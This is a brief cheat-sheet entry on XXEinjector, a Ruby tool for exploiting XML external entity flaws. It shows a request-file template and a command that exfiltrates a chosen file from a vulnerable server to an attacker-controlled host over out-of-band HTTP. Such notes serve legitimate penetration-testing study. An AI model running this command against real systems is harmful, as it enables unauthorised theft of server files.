XXEinjector

ruby script to exploit XXEs automatically.

To use the tool, you must first copy to a file the vulnerable request's headers and only include the first XML line in the body, followed by the keyword XXEINJECT:

POST /myrequest/vulnerable HTTP/1.1

-- SNIP--

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT

Commands

# Try to exfiltrate a file with XXE.
# Exfiltrated files get stored in the
# 'Logs' folder under XXEinjector:
xxe_injector --host=<attack box IP> --httpport=<attack box port> --file=<request file> --path=<file to exfiltrate> --oob=http --phpfilter
